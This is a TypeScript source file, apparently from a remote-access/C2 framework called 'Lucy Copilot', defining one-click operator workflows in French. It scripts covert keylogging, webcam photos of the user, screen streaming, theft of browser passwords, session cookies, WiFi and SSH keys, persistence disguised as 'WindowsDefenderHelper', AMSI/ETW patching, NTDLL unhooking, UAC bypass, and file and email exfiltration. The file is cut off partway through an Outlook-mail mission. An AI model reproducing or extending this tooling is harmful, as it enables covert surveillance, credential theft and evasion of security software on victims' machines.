/**
 * Mission definitions for the Lucy Copilot.
 * Each mission is a pre-configured, executable workflow that produces
 * actionable results. The user clicks "Lancer" — everything runs automatically.
 *
 * Mission design principles:
 * - Every step has a clear purpose and produces an insight
 * - Missions chain naturally (recon → credentials → lateral → persistence)
 * - Difficulty levels: quick (<30s), standard (<2min), advanced (>2min)
 * - Multi-agent missions can run on all agents simultaneously
 * - Each mission suggests logical next steps
 */

export interface MissionStep {
  module: string
  action: string
  params: Record<string, unknown>
  label: string
  /** What this step tells us when it succeeds — shown to user as insight */
  insight: string
  /** Whether to wait for this step before continuing (default: true) */
  wait?: boolean
  /** Timeout in seconds for this step */
  timeout?: number
}

export interface Mission {
  id: string
  title: string
  description: string
  icon: string  // lucide icon name
  category: MissionCategory
  difficulty: 'quick' | 'standard' | 'advanced' | 'expert'
  duration: string  // human-readable estimate
  steps: MissionStep[]
  /** Suggested next missions after completion (mission IDs) */
  suggests?: string[]
  /** Whether this mission needs a target agent */
  needsAgent: boolean
  /** Whether this mission can run on all agents simultaneously */
  multiAgent?: boolean
  /** Tags for filtering/searching */
  tags: string[]
  /** MITRE ATT&CK tactics covered */
  mitre?: string[]
  /** Whether this mission requires explicit operator approval before running (destructive/high-impact) */
  requiresApproval?: boolean
}

export type MissionCategory =
  | 'recon'
  | 'surveillance'
  | 'credentials'
  | 'persistence'
  | 'network'
  | 'evasion'
  | 'exfiltration'
  | 'lateral'
  | 'post-exploit'

// ===========================================================================
// RECON — Initial discovery and situational awareness
// ===========================================================================

const RECON_MISSIONS: Mission[] = [
  {
    id: 'quick-recon',
    title: 'Recon Express',
    description: 'Vue instantanée: système, écran, réseau, identité. Le minimum vital en 15 secondes.',
    icon: 'Zap',
    category: 'recon',
    difficulty: 'quick',
    duration: '~15s',
    needsAgent: true,
    multiAgent: true,
    tags: ['recon', 'fast', 'overview', 'baseline'],
    mitre: ['T1082', 'T1083', 'T1016'],
    steps: [
      { module: 'info', action: 'run', params: {}, label: 'Identité système', insight: 'OS, hostname, IP, utilisateur courant, architecture', timeout: 15 },
      { module: 'screenshot', action: 'capture', params: { quality: 70 }, label: 'Capture écran', insight: 'Vue du bureau — voir ce que l\'utilisateur fait', timeout: 15 },
      { module: 'shell', action: 'exec', params: { cmd: 'ipconfig /all', timeout: 10 }, label: 'Configuration réseau', insight: 'Interfaces, DNS, gateway, DHCP, MAC', timeout: 15 },
      { module: 'shell', action: 'exec', params: { cmd: 'whoami /groups', timeout: 10 }, label: 'Groupes & privilèges', insight: 'Admin local? Domain admin? Privilèges élevés?', timeout: 15 },
    ],
    suggests: ['full-recon', 'wifi-audit', 'credential-harvest', 'edr-check'],
  },
  {
    id: 'full-recon',
    title: 'Recon Complet',
    description: 'Énumération exhaustive: système, processus, services, réseau, shares, logiciels, startup. Tout ce qu\'il faut pour planifier la suite.',
    icon: 'Radar',
    category: 'recon',
    difficulty: 'standard',
    duration: '~60s',
    needsAgent: true,
    tags: ['recon', 'deep', 'enumeration', 'comprehensive'],
    mitre: ['T1082', 'T1083', 'T1016', 'T1007', 'T1069', 'T1087'],
    steps: [
      { module: 'info', action: 'run', params: {}, label: 'Info système', insight: 'OS, hostname, IP, utilisateur, RAM, CPU', timeout: 15 },
      { module: 'builtin', action: 'processes', params: {}, label: 'Processus actifs', insight: 'AV, EDR, outils de sécurité, applications sensibles', timeout: 20 },
      { module: 'builtin', action: 'services', params: {}, label: 'Services Windows', insight: 'Services en cours — cibles potentiels pour exploitation', timeout: 20 },
      { module: 'builtin', action: 'netinfo', params: {}, label: 'Infos réseau détaillées', insight: 'Domaine, DNS, DC, interfaces, routes', timeout: 15 },
      { module: 'builtin', action: 'netstat', params: {}, label: 'Connexions réseau', insight: 'Ports en écoute, connexions établies — cibles latérales', timeout: 20 },
      { module: 'builtin', action: 'shares', params: {}, label: 'Partages réseau', insight: 'Shares accessibles — vecteurs de mouvement latéral', timeout: 15 },
      { module: 'builtin', action: 'installed', params: {}, label: 'Logiciels installés', insight: 'Versions logiciels — vulnérabilités potentielles', timeout: 20 },
      { module: 'builtin', action: 'startup', params: {}, label: 'Programmes au démarrage', insight: 'Persistance existante — programmes auto-lancés', timeout: 15 },
      { module: 'builtin', action: 'env_secrets', params: {}, label: 'Secrets environnement', insight: 'Tokens, API keys, mots de passe en variables d\'env', timeout: 10 },
      { module: 'screenshot', action: 'capture', params: { quality: 80 }, label: 'Capture écran', insight: 'Vue du bureau — contexte visuel', timeout: 15 },
    ],
    suggests: ['credential-harvest', 'lateral-prep', 'persistence-audit', 'edr-check'],
  },
  {
    id: 'wifi-audit',
    title: 'Audit WiFi',
    description: 'Cartographie WiFi complète: adaptateur, connexion actuelle, réseaux visibles, profils sauvegardés, credentials WPA.',
    icon: 'Wifi',
    category: 'recon',
    difficulty: 'quick',
    duration: '~25s',
    needsAgent: true,
    multiAgent: true,
    tags: ['wifi', 'wireless', 'network', 'credentials'],
    mitre: ['T1016', 'T1040'],
    steps: [
      { module: 'wifi', action: 'status', params: {}, label: 'Statut adaptateur WiFi', insight: 'Adaptateur présent? Connecté? Quel SSID?', timeout: 15 },
      { module: 'wifi', action: 'scan', params: {}, label: 'Scan réseaux visibles', insight: 'Réseaux à portée — BSSID, signal, sécurité', timeout: 20 },
      { module: 'wifi', action: 'profiles', params: {}, label: 'Profils sauvegardés', insight: 'SSIDs connus — historique de connexions', timeout: 15 },
    ],
    suggests: ['wifi-credentials', 'quick-recon', 'subnet-scan'],
  },
  {
    id: 'process-audit',
    title: 'Audit Processus',
    description: 'Analyse profonde des processus: AV/EDR, services suspects, connexions réseau par processus.',
    icon: 'ListTree',
    category: 'recon',
    difficulty: 'standard',
    duration: '~30s',
    needsAgent: true,
    tags: ['process', 'av', 'edr', 'security', 'analysis'],
    mitre: ['T1057', 'T1068', 'T1082'],
    steps: [
      { module: 'builtin', action: 'processes', params: {}, label: 'Liste processus', insight: 'Tous les processus en cours avec PID', timeout: 20 },
      { module: 'process', action: 'list', params: {}, label: 'Détails processus', insight: 'Arbre processus, parents, enfants', timeout: 15 },
      { module: 'shell', action: 'exec', params: { cmd: 'tasklist /svc', timeout: 15 }, label: 'Services par processus', insight: 'Services hébergés par svchost — cibles potentiels', timeout: 20 },
      { module: 'shell', action: 'exec', params: { cmd: 'netstat -ano | findstr LISTENING', timeout: 15 }, label: 'Ports en écoute par PID', insight: 'Quel processus écoute sur quel port', timeout: 20 },
    ],
    suggests: ['edr-check', 'full-recon', 'credential-harvest'],
  },
  {
    id: 'geo-locate',
    title: 'Géolocalisation',
    description: 'Détermine la localisation physique approximative via IP et réseau.',
    icon: 'MapPin',
    category: 'recon',
    difficulty: 'quick',
    duration: '~10s',
    needsAgent: true,
    tags: ['geo', 'location', 'ip', 'physical'],
    mitre: ['T1016'],
    steps: [
      { module: 'shell', action: 'exec', params: { cmd: 'curl -s https://ipinfo.io/json', timeout: 10 }, label: 'IP publique + géo', insight: 'IP publique, ville, région, ISP', timeout: 15 },
      { module: 'builtin', action: 'netinfo', params: {}, label: 'Infos réseau local', insight: 'Domaine, subnet, DC — contexte corp', timeout: 10 },
    ],
    suggests: ['quick-recon', 'subnet-scan'],
  },
]

// ===========================================================================
// SURVEILLANCE — Visual and input monitoring
// ===========================================================================

const SURVEILLANCE_MISSIONS: Mission[] = [
  {
    id: 'screenshot',
    title: 'Capture Écran',
    description: 'Screenshot instantané haute qualité du bureau de l\'agent. Vois ce qu\'il fait maintenant.',
    icon: 'Camera',
    category: 'surveillance',
    difficulty: 'quick',
    duration: '~5s',
    needsAgent: true,
    multiAgent: true,
    tags: ['screenshot', 'visual', 'quick'],
    mitre: ['T1113'],
    steps: [
      { module: 'screenshot', action: 'capture', params: { quality: 85 }, label: 'Capture écran', insight: 'Vue du bureau actuel', timeout: 15 },
    ],
    suggests: ['screen-stream', 'keylog-session', 'webcam-capture'],
  },
  {
    id: 'screen-stream',
    title: 'Streaming Écran Live',
    description: 'Démarre le streaming en temps réel de l\'écran. Tu vois ce que l\'utilisateur voit en direct.',
    icon: 'Monitor',
    category: 'surveillance',
    difficulty: 'standard',
    duration: 'live',
    needsAgent: true,
    tags: ['stream', 'live', 'screen', 'realtime'],
    mitre: ['T1113'],
    steps: [
      { module: 'screen_stream', action: 'start', params: { fps: 5, quality: 50 }, label: 'Démarrage stream', insight: 'Streaming live actif — ouvre le Remote Desktop pour voir', timeout: 15 },
    ],
    suggests: ['remote-control', 'keylog-session'],
  },
  {
    id: 'keylog-session',
    title: 'Session Keylogger',
    description: 'Capture toutes les frappes clavier pendant 60 secondes. Idéal pour intercepter mots de passe saisis.',
    icon: 'Keyboard',
    category: 'surveillance',
    difficulty: 'standard',
    duration: '~70s',
    needsAgent: true,
    tags: ['keylog', 'keystrokes', 'credentials', 'password'],
    mitre: ['T1056'],
    steps: [
      { module: 'keylog', action: 'start', params: { duration: 60, flush_interval: 10 }, label: 'Démarrage keylogger (60s)', insight: 'Capture en cours — l\'utilisateur tape normalement', timeout: 75 },
      { module: 'keylog', action: 'dump', params: {}, label: 'Récupération frappes', insight: 'Frappes capturées — cherche mots de passe, URLs, messages', timeout: 15 },
    ],
    suggests: ['credential-harvest', 'screenshot', 'clipboard-grab'],
  },
  {
    id: 'keylog-extended',
    title: 'Keylogger Étendu (5 min)',
    description: 'Capture frappes pendant 5 minutes pour intercepter une session de travail complète.',
    icon: 'Keyboard',
    category: 'surveillance',
    difficulty: 'advanced',
    duration: '~5min',
    needsAgent: true,
    tags: ['keylog', 'extended', 'long', 'credentials'],
    mitre: ['T1056'],
    steps: [
      { module: 'keylog', action: 'start', params: { duration: 300, flush_interval: 30 }, label: 'Démarrage keylogger (5min)', insight: 'Capture longue durée en cours', timeout: 310 },
      { module: 'keylog', action: 'dump', params: {}, label: 'Récupération frappes', insight: '5 minutes de frappes — analyse pour credentials', timeout: 15 },
    ],
    suggests: ['credential-harvest', 'clipboard-grab', 'screenshot'],
  },
  {
    id: 'webcam-capture',
    title: 'Capture Webcam',
    description: 'Prend une photo discrète avec la webcam. Identifie qui est devant la machine.',
    icon: 'Video',
    category: 'surveillance',
    difficulty: 'quick',
    duration: '~10s',
    needsAgent: true,
    tags: ['webcam', 'camera', 'photo', 'identification'],
    mitre: ['T1113'],
    steps: [
      { module: 'webcam', action: 'capture', params: {}, label: 'Capture webcam', insight: 'Photo de la personne devant la machine', timeout: 15 },
    ],
    suggests: ['screenshot', 'screen-stream', 'keylog-session'],
  },
  {
    id: 'clipboard-monitor',
    title: 'Moniteur Clipboard',
    description: 'Surveille le presse-papiers en continu. Intercepte les mots de passe copiés.',
    icon: 'Clipboard',
    category: 'surveillance',
    difficulty: 'standard',
    duration: '~30s',
    needsAgent: true,
    tags: ['clipboard', 'monitor', 'credentials', 'copy'],
    mitre: ['T1115'],
    steps: [
      { module: 'clipboard', action: 'capture', params: {}, label: 'Capture clipboard actuel', insight: 'Contenu actuel du presse-papiers', timeout: 10 },
      { module: 'clipboard', action: 'monitor', params: { duration: 20 }, label: 'Monitor 20s', insight: 'Changements de clipboard pendant 20 secondes', timeout: 25 },
    ],
    suggests: ['credential-harvest', 'keylog-session'],
  },
  {
    id: 'full-surveillance',
    title: 'Surveillance Totale',
    description: 'Screenshot + webcam + keylog 60s + clipboard. Package complet pour observer l\'activité.',
    icon: 'Eye',
    category: 'surveillance',
    difficulty: 'advanced',
    duration: '~80s',
    needsAgent: true,
    tags: ['surveillance', 'complete', 'package', 'observation'],
    mitre: ['T1113', 'T1056', 'T1115'],
    steps: [
      { module: 'screenshot', action: 'capture', params: { quality: 80 }, label: 'Capture écran', insight: 'Vue du bureau', timeout: 15 },
      { module: 'webcam', action: 'capture', params: {}, label: 'Photo webcam', insight: 'Qui est devant?', timeout: 15 },
      { module: 'clipboard', action: 'capture', params: {}, label: 'Clipboard', insight: 'Contenu presse-papiers', timeout: 10 },
      { module: 'keylog', action: 'start', params: { duration: 60, flush_interval: 15 }, label: 'Keylog 60s', insight: 'Capture frappes en cours', timeout: 75 },
      { module: 'keylog', action: 'dump', params: {}, label: 'Récupération frappes', insight: 'Frappes capturées', timeout: 15 },
    ],
    suggests: ['credential-harvest', 'screen-stream'],
  },
]

// ===========================================================================
// CREDENTIALS — Password and token harvesting
// ===========================================================================

const CREDENTIAL_MISSIONS: Mission[] = [
  {
    id: 'credential-harvest',
    title: 'Récolte Credentials Complète',
    description: 'Tous les credentials en une fois: browsers, WiFi, Windows Credential Manager, SSH keys, env secrets.',
    icon: 'KeyRound',
    category: 'credentials',
    difficulty: 'standard',
    duration: '~90s',
    needsAgent: true,
    tags: ['credentials', 'passwords', 'harvest', 'complete', 'all'],
    mitre: ['T1555', 'T1003', 'T1528', 'T1552'],
    steps: [
      { module: 'browser', action: 'passwords', params: { browsers: ['chrome', 'firefox', 'edge'], limit: 500 }, label: 'Passwords navigateurs', insight: 'Chrome/Firefox/Edge — tous les mots de passe sauvegardés', timeout: 60 },
      { module: 'browser', action: 'cookies', params: {}, label: 'Cookies navigateurs', insight: 'Session cookies — pour hijack de session', timeout: 30 },
      { module: 'wifi', action: 'credentials', params: {}, label: 'Credentials WiFi', insight: 'Clés WPA/WPA2 de tous les réseaux sauvegardés', timeout: 15 },
      { module: 'builtin', action: 'credential_manager', params: {}, label: 'Windows Credential Manager', insight: 'Credentials Windows stockés — shares, RDP, etc.', timeout: 20 },
      { module: 'builtin', action: 'ssh_keys', params: {}, label: 'Clés SSH', insight: 'Clés privées dans ~/.ssh — accès aux serveurs', timeout: 10 },
      { module: 'builtin', action: 'env_secrets', params: {}, label: 'Secrets environnement', insight: 'API keys, tokens, mots de passe en variables', timeout: 10 },
    ],
    suggests: ['browser-history', 'clipboard-grab', 'keylog-session', 'lateral-prep'],
  },
  {
    id: 'browser-passwords',
    title: 'Passwords Navigateurs',
    description: 'Extrait tous les mots de passe sauvegardés dans Chrome, Firefox, Edge.',
    icon: 'Globe',
    category: 'credentials',
    difficulty: 'quick',
    duration: '~30s',
    needsAgent: true,
    multiAgent: true,
    tags: ['browser', 'passwords', 'chrome', 'firefox', 'edge'],
    mitre: ['T1555.003'],
    steps: [
      { module: 'browser', action: 'passwords', params: { browsers: ['chrome', 'firefox', 'edge'], limit: 1000 }, label: 'Extraction passwords', insight: 'Tous les passwords sauvegardés — sites, usernames, passwords', timeout: 45 },
    ],
    suggests: ['browser-cookies', 'browser-history', 'credential-harvest'],
  },
  {
    id: 'browser-cookies',
    title: 'Cookies Navigateurs',
    description: 'Récupère les cookies de session pour hijack de sessions web.',
    icon: 'Cookie',
    category: 'credentials',
    difficulty: 'quick',
    duration: '~20s',
    needsAgent: true,
    tags: ['browser', 'cookies', 'session', 'hijack'],
    mitre: ['T1539'],
    steps: [
      { module: 'browser', action: 'cookies', params: { browsers: ['chrome', 'firefox', 'edge'] }, label: 'Extraction cookies', insight: 'Session cookies — pour réutilisation/hijack', timeout: 30 },
    ],
    suggests: ['browser-passwords', 'browser-history'],
  },
  {
    id: 'browser-history',
    title: 'Historique Navigateurs',
    description: 'Récupère l\'historique de navigation — sites visités, recherches, destinations.',
    icon: 'History',
    category: 'credentials',
    difficulty: 'quick',
    duration: '~20s',
    needsAgent: true,
    tags: ['browser', 'history', 'urls', 'recon'],
    mitre: ['T1217'],
    steps: [
      { module: 'browser', action: 'history', params: { browsers: ['chrome', 'firefox', 'edge'], limit: 500 }, label: 'Historique navigation', insight: 'Sites visités — portals, webmails, apps internes', timeout: 30 },
    ],
    suggests: ['browser-passwords', 'browser-cookies', 'credential-harvest'],
  },
  {
    id: 'wifi-credentials',
    title: 'Credentials WiFi',
    description: 'Extrait toutes les clés WPA/WPA2 sauvegardées sur la machine.',
    icon: 'Wifi',
    category: 'credentials',
    difficulty: 'quick',
    duration: '~15s',
    needsAgent: true,
    multiAgent: true,
    tags: ['wifi', 'credentials', 'wpa', 'password', 'wireless'],
    mitre: ['T1003'],
    steps: [
      { module: 'wifi', action: 'credentials', params: {}, label: 'Extraction clés WiFi', insight: 'Toutes les clés WPA — accès aux réseaux', timeout: 15 },
    ],
    suggests: ['wifi-audit', 'credential-harvest'],
  },
  {
    id: 'clipboard-grab',
    title: 'Clipboard Grab',
    description: 'Capture immédiate du presse-papiers. Les utilisateurs copient souvent des mots de passe.',
    icon: 'Clipboard',
    category: 'credentials',
    difficulty: 'quick',
    duration: '~5s',
    needsAgent: true,
    multiAgent: true,
    tags: ['clipboard', 'quick', 'password', 'copy'],
    mitre: ['T1115'],
    steps: [
      { module: 'clipboard', action: 'capture', params: {}, label: 'Capture clipboard', insight: 'Contenu du presse-papiers — mot de passe copié?', timeout: 10 },
    ],
    suggests: ['credential-harvest', 'keylog-session', 'clipboard-monitor'],
  },
  {
    id: 'ssh-keys',
    title: 'Clés SSH',
    description: 'Récupère les clés privées SSH pour accès aux serveurs Linux.',
    icon: 'Terminal',
    category: 'credentials',
    difficulty: 'quick',
    duration: '~10s',
    needsAgent: true,
    tags: ['ssh', 'keys', 'linux', 'server', 'access'],
    mitre: ['T1552.004'],
    steps: [
      { module: 'builtin', action: 'ssh_keys', params: {}, label: 'Extraction clés SSH', insight: 'Clés privées dans ~/.ssh — accès aux serveurs', timeout: 10 },
    ],
    suggests: ['credential-harvest', 'lateral-prep'],
  },
  {
    id: 'credential-manager',
    title: 'Windows Credential Manager',
    description: 'Extrait les credentials stockés par Windows (RDP, shares, web).',
    icon: 'Database',
    category: 'credentials',
    difficulty: 'quick',
    duration: '~15s',
    needsAgent: true,
    tags: ['windows', 'credential', 'manager', 'rdp', 'shares'],
    mitre: ['T1555'],
    steps: [
      { module: 'builtin', action: 'credential_manager', params: {}, label: 'Extraction Credential Manager', insight: 'Credentials Windows — RDP, SMB, web auth', timeout: 20 },
    ],
    suggests: ['credential-harvest', 'lateral-prep'],
  },
]

// ===========================================================================
// PERSISTENCE — Maintaining access
// ===========================================================================

const PERSISTENCE_MISSIONS: Mission[] = [
  {
    id: 'persistence-audit',
    title: 'Audit Persistence',
    description: 'Vérifie tous les mécanismes de persistance existants. Suis-je déjà installé?',
    icon: 'Anchor',
    category: 'persistence',
    difficulty: 'quick',
    duration: '~20s',
    needsAgent: true,
    tags: ['persistence', 'audit', 'check', 'existing'],
    mitre: ['T1547', 'T1053', 'T1543'],
    steps: [
      { module: 'persistence', action: 'check', params: {}, label: 'Check persistance Lucy', insight: 'Mécanismes Lucy déjà installés', timeout: 15 },
      { module: 'builtin', action: 'startup', params: {}, label: 'Startup entries', insight: 'Programmes au démarrage — persistance tierce', timeout: 15 },
      { module: 'builtin', action: 'persist', params: {}, label: 'Énumération persistance Windows', insight: 'Registry Run, services, scheduled tasks', timeout: 20 },
    ],
    suggests: ['full-recon', 'persistence-install'],
  },
  {
    id: 'persistence-install',
    title: 'Installer Persistance',
    description: 'Installe un mécanisme de persistance pour survivre aux redémarrages.',
    icon: 'Power',
    category: 'persistence',
    difficulty: 'standard',
    duration: '~20s',
    needsAgent: true,
    tags: ['persistence', 'install', 'survive', 'reboot'],
    mitre: ['T1547', 'T1053'],
    requiresApproval: true,
    steps: [
      { module: 'persistence', action: 'install', params: { method: 'auto', name: 'lucy_agent' }, label: 'Installation persistance', insight: 'Persistance installée — survie au reboot', timeout: 20 },
      { module: 'persistence', action: 'check', params: {}, label: 'Vérification', insight: 'Confirmation que la persistance est active', timeout: 10 },
    ],
    suggests: ['persistence-audit', 'edr-check'],
  },
  {
    id: 'persistence-advanced',
    title: 'Persistance Avancée',
    description: 'Multiples mécanismes: Registry Run, scheduled task, COM hijack. Redondance maximale.',
    icon: 'Layers',
    category: 'persistence',
    difficulty: 'advanced',
    duration: '~45s',
    needsAgent: true,
    tags: ['persistence', 'advanced', 'redundant', 'stealth'],
    mitre: ['T1547.001', 'T1053.005', 'T1546.001'],
    requiresApproval: true,
    steps: [
      { module: 'persistence', action: 'install', params: { method: 'registry', name: 'WindowsDefenderHelper' }, label: 'Registry Run', insight: 'Persistance via Registry Run key', timeout: 15 },
      { module: 'persistence_adv', action: 'scheduled_task_trigger', params: {}, label: 'Scheduled Task', insight: 'Tâche planifiée — déclenchement à la connexion', timeout: 20 },
      { module: 'persistence_adv', action: 'list_persistence', params: {}, label: 'Vérification globale', insight: 'Tous les mécanismes installés', timeout: 15 },
    ],
    suggests: ['persistence-audit', 'edr-check', 'stealth-mode'],
  },
]

// ===========================================================================
// NETWORK — Discovery and mapping
// ===========================================================================

const NETWORK_MISSIONS: Mission[] = [
  {
    id: 'port-scan-local',
    title: 'Scan Ports Local',
    description: 'Scan des ports ouverts sur la machine de l\'agent. Découvre les services exposés.',
    icon: 'Crosshair',
    category: 'network',
    difficulty: 'quick',
    duration: '~30s',
    needsAgent: true,
    tags: ['port', 'scan', 'local', 'services'],
    mitre: ['T1046'],
    steps: [
      { module: 'port_scan', action: 'scan', params: { host: '127.0.0.1', ports: [22, 80, 135, 139, 443, 445, 1433, 1521, 3306, 3389, 5432, 5985, 8080, 8443, 9200], timeout: 2 }, label: 'Scan ports locaux', insight: 'Services en écoute — cibles d\'exploitation', timeout: 30 },
    ],
    suggests: ['subnet-scan', 'full-recon', 'lateral-prep'],
  },
  {
    id: 'subnet-scan',
    title: 'Scan Sous-réseau',
    description: 'Découverte d\'hôtes sur le sous-réseau. Qui d\'autre est sur le réseau?',
    icon: 'Network',
    category: 'network',
    difficulty: 'standard',
    duration: '~120s',
    needsAgent: true,
    tags: ['subnet', 'discovery', 'hosts', 'network', 'sweep'],
    mitre: ['T1046', 'T1018'],
    steps: [
      { module: 'port_scan', action: 'subnet', params: { cidr: '192.168.18.0/24', timeout: 1 }, label: 'Scan sous-réseau 192.168.18.0/24', insight: 'Hôtes vivs sur le réseau — cibles latérales', timeout: 120 },
    ],
    suggests: ['lateral-prep', 'full-recon', 'port-scan-local'],
  },
  {
    id: 'lateral-prep',
    title: 'Préparation Latérale',
    description: 'Énumère shares, sessions, users domaine, admins. Prépare le mouvement latéral.',
    icon: 'GitBranch',
    category: 'lateral',
    difficulty: 'standard',
    duration: '~45s',
    needsAgent: true,
    tags: ['lateral', 'movement', 'domain', 'shares', 'sessions'],
    mitre: ['T1069', 'T1087', 'T1018', 'T1046'],
    steps: [
      { module: 'builtin', action: 'shares', params: {}, label: 'Partages réseau', insight: 'Shares accessibles — vecteurs latéraux', timeout: 15 },
      { module: 'builtin', action: 'sessions', params: {}, label: 'Sessions réseau', insight: 'Qui est connecté où — cibles de hijack', timeout: 15 },
      { module: 'builtin', action: 'domain_users', params: {}, label: 'Users du domaine', insight: 'Comptes AD — cibles de phishing/brute force', timeout: 20 },
      { module: 'builtin', action: 'domain_admins', params: {}, label: 'Admins du domaine', insight: 'Comptes privilégiés — cibles prioritaires', timeout: 15 },
      { module: 'builtin', action: 'netinfo', params: {}, label: 'Infos domaine', insight: 'Domain, DNS, DC — infrastructure AD', timeout: 15 },
    ],
    suggests: ['credential-harvest', 'subnet-scan', 'full-recon'],
  },
  {
    id: 'network-map',
    title: 'Cartographie Réseau',
    description: 'Mappe le réseau complet: interfaces, routes, ARP, connexions, DNS. Vue 360°.',
    icon: 'Map',
    category: 'network',
    difficulty: 'standard',
    duration: '~40s',
    needsAgent: true,
    tags: ['network', 'map', 'routes', 'arp', 'dns', 'complete'],
    mitre: ['T1016', 'T1046', 'T1018'],
    steps: [
      { module: 'builtin', action: 'netinfo', params: {}, label: 'Interfaces & DNS', insight: 'Toutes les interfaces, DNS, domain', timeout: 15 },
      { module: 'builtin', action: 'netstat', params: {}, label: 'Connexions actives', insight: 'Ports en écoute + connexions établies', timeout: 20 },
      { module: 'builtin', action: 'arp', params: {}, label: 'Table ARP', insight: 'Hôtes récemment contactés — voisins réseau', timeout: 10 },
      { module: 'builtin', action: 'routes', params: {}, label: 'Table de routage', insight: 'Routes — passerelles, VPN, sous-réseaux', timeout: 10 },
    ],
    suggests: ['subnet-scan', 'lateral-prep', 'full-recon'],
  },
]

// ===========================================================================
// EVASION — Detection avoidance and OPSEC
// ===========================================================================

const EVASION_MISSIONS: Mission[] = [
  {
    id: 'edr-check',
    title: 'Check EDR/AV',
    description: 'Détecte antivirus, EDR, outils de sécurité. Suis-je detecté?',
    icon: 'ShieldAlert',
    category: 'evasion',
    difficulty: 'quick',
    duration: '~20s',
    needsAgent: true,
    multiAgent: true,
    tags: ['edr', 'av', 'detection', 'security', 'check'],
    mitre: ['T1518.001', 'T1057'],
    steps: [
      { module: 'anti_analysis', action: 'check', params: { abort_on_detected: false }, label: 'Check sandbox/VM', insight: 'Environnement virtuel? Sandboxing?', timeout: 15 },
      { module: 'builtin', action: 'processes', params: {}, label: 'Processus (AV/EDR)', insight: 'AV, EDR, outils de sécurité en cours', timeout: 20 },
      { module: 'stealth', action: 'indicators', params: {}, label: 'Indicateurs stealth', insight: 'Statut furtif de l\'agent', timeout: 10 },
    ],
    suggests: ['edr-bypass', 'full-recon', 'stealth-mode'],
  },
  {
    id: 'edr-bypass',
    title: 'Bypass EDR/AV',
    description: 'Patch AMSI, ETW, unhook NTDLL. Aveugle les détections pour opérer librement.',
    icon: 'ShieldOff',
    category: 'evasion',
    difficulty: 'advanced',
    duration: '~30s',
    needsAgent: true,
    tags: ['edr', 'bypass', 'amsi', 'etw', 'unhook', 'stealth'],
    mitre: ['T1562.001', 'T1562.002'],
    requiresApproval: true,
    steps: [
      { module: 'edr_evasion', action: 'patch_amsi', params: {}, label: 'Patch AMSI', insight: 'AMSI patché — scripts PS non détectés', timeout: 15 },
      { module: 'edr_evasion', action: 'patch_etw', params: {}, label: 'Patch ETW', insight: 'ETW patché — logging événements désactivé', timeout: 15 },
      { module: 'edr_evasion', action: 'unhook_ntdll', params: {}, label: 'Unhook NTDLL', insight: 'NTDLL unhooked — API calls non monitorés', timeout: 15 },
      { module: 'edr_evasion', action: 'status', params: {}, label: 'Statut bypass', insight: 'Confirmation des patches appliqués', timeout: 10 },
    ],
    suggests: ['edr-check', 'credential-harvest', 'persistence-install'],
  },
  {
    id: 'stealth-mode',
    title: 'Mode Furtif',
    description: 'Active le mode stealth: délais adaptatifs, sleep mask, masquage.',
    icon: 'Ghost',
    category: 'evasion',
    difficulty: 'standard',
    duration: '~15s',
    needsAgent: true,
    tags: ['stealth', 'hidden', 'sleep', 'mask', 'adaptive'],
    mitre: ['T1027', 'T1497'],
    steps: [
      { module: 'stealth', action: 'indicators', params: {}, label: 'Check indicateurs', insight: 'État actuel du stealth', timeout: 10 },
      { module: 'sleep_mask', action: 'enable', params: {}, label: 'Sleep mask ON', insight: 'Memory masking en idle — évite le scan', timeout: 10 },
    ],
    suggests: ['edr-bypass', 'persistence-advanced'],
  },
  {
    id: 'uac-bypass',
    title: 'UAC Bypass',
    description: 'Tente un bypass UAC pour élever les privilèges sans prompt admin.',
    icon: 'ArrowUpCircle',
    category: 'evasion',
    difficulty: 'advanced',
    duration: '~20s',
    needsAgent: true,
    tags: ['uac', 'bypass', 'privesc', 'elevation'],
    mitre: ['T1548.002'],
    requiresApproval: true,
    steps: [
      { module: 'uac_bypass', action: 'check_uac', params: {}, label: 'Check niveau UAC', insight: 'Niveau UAC actuel — bypass nécessaire?', timeout: 10 },
      { module: 'uac_bypass', action: 'auto', params: {}, label: 'Bypass automatique', insight: 'Tente le meilleur bypass disponible', timeout: 20 },
    ],
    suggests: ['edr-bypass', 'credential-harvest', 'persistence-install'],
  },
]

// ===========================================================================
// EXFILTRATION — Data collection and extraction
// ===========================================================================

const EXFIL_MISSIONS: Mission[] = [
  {
    id: 'file-search',
    title: 'Recherche Fichiers Sensibles',
    description: 'Cherche documents, PDFs, spreadsheets, configs sur le bureau et documents.',
    icon: 'FileSearch',
    category: 'exfiltration',
    difficulty: 'standard',
    duration: '~30s',
    needsAgent: true,
    tags: ['file', 'search', 'documents', 'sensitive', 'exfil'],
    mitre: ['T1083', 'T1005'],
    steps: [
      { module: 'shell', action: 'exec', params: { cmd: 'dir /s /b C:\\Users\\*\\Documents\\*.pdf C:\\Users\\*\\Documents\\*.docx C:\\Users\\*\\Documents\\*.xlsx C:\\Users\\*\\Desktop\\*.pdf C:\\Users\\*\\Desktop\\*.docx 2>nul', timeout: 20 }, label: 'Recherche documents', insight: 'Documents sensibles trouvés', timeout: 25 },
      { module: 'shell', action: 'exec', params: { cmd: 'dir /s /b C:\\Users\\*\\*.txt C:\\Users\\*\\*.csv C:\\Users\\*\\*.conf C:\\Users\\*\\*.cfg C:\\Users\\*\\*.ini 2>nul | findstr /i "password credential secret token key"', timeout: 20 }, label: 'Recherche configs', insight: 'Fichiers de config avec mots-clés sensibles', timeout: 25 },
      { module: 'file', action: 'search', params: { path: 'C:\\Users', pattern: '*.pdf', recursive: true }, label: 'PDFs', insight: 'Tous les PDFs — possibles documents confidentiels', timeout: 30 },
    ],
    suggests: ['file-exfil', 'credential-harvest', 'full-recon'],
  },
  {
    id: 'file-exfil',
    title: 'Exfiltration Fichiers',
    description: 'Liste et exfiltre les fichiers du bureau et documents.',
    icon: 'Download',
    category: 'exfiltration',
    difficulty: 'standard',
    duration: '~60s',
    needsAgent: true,
    tags: ['exfil', 'download', 'files', 'steal'],
    mitre: ['T1005', 'T1567'],
    steps: [
      { module: 'file', action: 'list', params: { path: 'C:\\Users\\public\\Desktop' }, label: 'Bureau public', insight: 'Fichiers sur le bureau public', timeout: 10 },
      { module: 'file', action: 'tree', params: { path: 'C:\\Users\\public\\Documents', recursive: false }, label: 'Documents', insight: 'Arborescence des documents', timeout: 15 },
      { module: 'file', action: 'search', params: { path: 'C:\\Users', pattern: '*.pdf', recursive: true }, label: 'Tous les PDFs', insight: 'PDFs à exfiltrer', timeout: 30 },
    ],
    suggests: ['file-search', 'credential-harvest'],
  },
  {
    id: 'outlook-grab',
    title: 'Emails Outlook',
    description: 'Récupère les emails Outlook récents — communications sensibles.',
